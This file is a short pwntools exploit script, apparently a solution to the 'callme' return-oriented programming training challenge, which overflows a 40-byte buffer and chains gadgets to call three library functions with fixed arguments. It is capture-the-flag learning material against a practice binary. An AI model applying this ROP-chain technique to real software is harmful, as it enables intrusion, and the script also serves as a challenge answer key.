from pwn import*
elf_path="./callme"
elf =  context.binary = ELF(elf_path)
io = process(elf.path)

callme_one_address = elf.plt['callme_one']
print (f"[+] callme_one_address is {hex(callme_one_address)}")
callme_two_address = elf.plt['callme_two']
print (f"[+] callme_two_address is {hex(callme_two_address)}")
callme_three_address = elf.plt['callme_three']
print (f"[+] callme_three_address is {hex(callme_three_address)}")
exit_address = elf.plt['exit']
print (f"[+] exit address is {hex(exit_address)}")
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
print (f"[+] gadget of pop rdi t is  {hex(pop_rdi)}")
rop = ROP(elf)
Gadget_address = rop.find_gadget(['pop rdi' ,'pop rsi', 'pop rdx', 'ret'])[0]
print (f"[+] 3 gadgets address is  {hex(Gadget_address)}")
ret_address = rop.find_gadget(['ret'])[0]
print (f"[+] ret gadget address is  {hex(ret_address)}")
offset = 40
payload = b"A" * offset
print ("=" *70)
payload += p64 (Gadget_address)
payload += p64 (0xdeadbeefdeadbeef)
payload += p64 (0xcafebabecafebabe)
payload += p64 (0xd00df00dd00df00d)
payload += p64 (callme_one_address)
payload += p64 (Gadget_address)
payload += p64 (0xdeadbeefdeadbeef)
payload += p64 (0xcafebabecafebabe)
payload += p64 (0xd00df00dd00df00d)
payload += p64 (callme_two_address)
payload += p64 (Gadget_address)
payload += p64 (0xdeadbeefdeadbeef)
payload += p64 (0xcafebabecafebabe)
payload += p64 (0xd00df00dd00df00d)
payload += p64 (callme_three_address)
payload += p64 (pop_rdi)
payload += p64 (0)
payload += p64 (exit_address)
io.sendlineafter(b'Hope you read the instructions',payload)
io.interactive()

